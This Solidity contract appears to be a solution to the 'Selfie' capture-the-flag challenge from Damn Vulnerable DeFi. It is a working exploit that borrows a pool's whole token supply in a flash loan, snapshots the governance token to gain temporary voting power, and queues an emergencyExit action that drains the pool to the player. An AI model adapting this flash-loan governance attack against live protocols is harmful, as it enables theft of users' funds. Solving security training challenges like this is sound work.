// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract AttackSelfie is IERC3156FlashBorrower {

  bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
  DamnValuableTokenSnapshot dvt;
  SimpleGovernance gov;
  SelfiePool pool;
  address player; //@audit always hardcode your address or can be frontrun/executed by mev bot
  uint256 actionId;

  constructor(address _gov, address _dvt, address _pool, address _player) {
    gov = SimpleGovernance(_gov);
    dvt = DamnValuableTokenSnapshot(_dvt);
    pool = SelfiePool(_pool);
    player = _player;
  }

  function queue() external {
    pool.flashLoan(IERC3156FlashBorrower(this), address(dvt), pool.maxFlashLoan(address(dvt)), '');
  }

  function execute() external {
    gov.executeAction(actionId);
  }

  function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
  ) external override returns (bytes32) {
    dvt.snapshot();
    actionId = gov.queueAction(address(pool), 0 ether, abi.encodeCall(pool.emergencyExit, player));
    dvt.approve(address(pool), amount);
    return CALLBACK_SUCCESS;
  }
}